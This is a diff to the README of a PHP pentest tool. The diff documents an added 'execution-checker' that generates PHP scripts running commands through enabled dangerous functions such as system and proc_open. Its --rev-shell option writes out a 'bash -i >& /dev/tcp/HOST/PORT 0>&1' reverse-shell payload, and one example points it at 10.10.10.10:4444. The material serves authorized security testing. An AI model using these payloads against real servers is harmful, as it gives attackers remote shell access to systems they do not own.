@@ -14,6 +14,9 @@ This repo has three equivalent implementations:
 - `python-3-port/dfunc-audit.py` — Python 3 port
 - `php-port/dfunc-audit.php` — PHP port
 
+Each active port also ships a companion `execution-checker` script — see
+[Confirming command execution](#confirming-command-execution) below.
+
 ## Usage
 Run with `-h` for the full help, including examples:
 ```
@@ -70,3 +73,63 @@ This is useful for running directly on a server you control, to confirm what the
 phpinfo-based analysis above suggested. See the `-h` output above for the available
 `--functions`, `--include-defaults` and `--enabled-only` flags. Once generated, run it on
 the server with `php check.php`.
+
+## Confirming command execution
+Once `--gen-checker --enabled-only` (above) tells you which dangerous functions are
+actually enabled on a lab/test target, `execution-checker` goes one step further: it
+generates a standalone PHP script that runs one specific command through one of those
+enabled functions, so you can confirm command execution genuinely works rather than just
+that the function is callable. Only use this against servers you're authorized to test.
+
+Supported functions: `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`.
+Every function gets the same default test case if you omit `--command`: it runs `id` so
+you get an immediate, harmless confirmation that execution works before trying anything
+riskier.
+
+For something more than a connectivity test, `--rev-shell --host HOST --port PORT`
+generates a `bash -i >& /dev/tcp/HOST/PORT 0>&1` reverse-shell payload through the chosen
+function instead — e.g. pick `proc_open` and point it at a listener you control.
+
+```
+$ python3 python-3-port/execution-checker.py -h
+usage: execution-checker.py [-h] --function NAME [--command CMD] [--rev-shell]
+                            [--host HOST] [--port PORT] --output OUTPUT_FILE
+
+Generates a small, self-contained PHP script that runs one command through
+one specific PHP function you've already confirmed is enabled (e.g. via
+dfunc-audit.py --gen-checker --enabled-only), to confirm that command
+execution actually works through it on a server you are authorized to test.
+
+options:
+  -h, --help            show this help message and exit
+  --function NAME       The dangerous function you've confirmed is enabled,
+                        one of: exec, passthru, popen, proc_open, shell_exec,
+                        system.
+  --command CMD         The shell command to run through that function.
+                        Defaults to 'id', a harmless default test case.
+                        Ignored if --rev-shell is given.
+  --rev-shell           Generate a reverse shell payload (bash -i >&
+                        /dev/tcp/HOST/PORT 0>&1) instead of running --command.
+                        Requires --host and --port.
+  --host HOST           Listener host/IP to connect back to. Required with
+                        --rev-shell.
+  --port PORT           Listener port to connect back to. Required with --rev-
+                        shell.
+  --output OUTPUT_FILE  Where to write the generated PHP script.
+
+examples:
+  Confirm system() executes commands (uses the default 'id' test):
+    execution-checker.py --function system --output check.php
+
+  Try a different enabled function and command:
+    execution-checker.py --function shell_exec --command whoami --output check.php
+
+  Generate a reverse shell payload through proc_open:
+    execution-checker.py --function proc_open --rev-shell --host 10.10.10.10 --port 4444 --output check.php
+
+  Then on the server:
+    php check.php
+```
+
+The PHP port supports the same flags and prints the same help:
+`php php-port/execution-checker.php -h`.
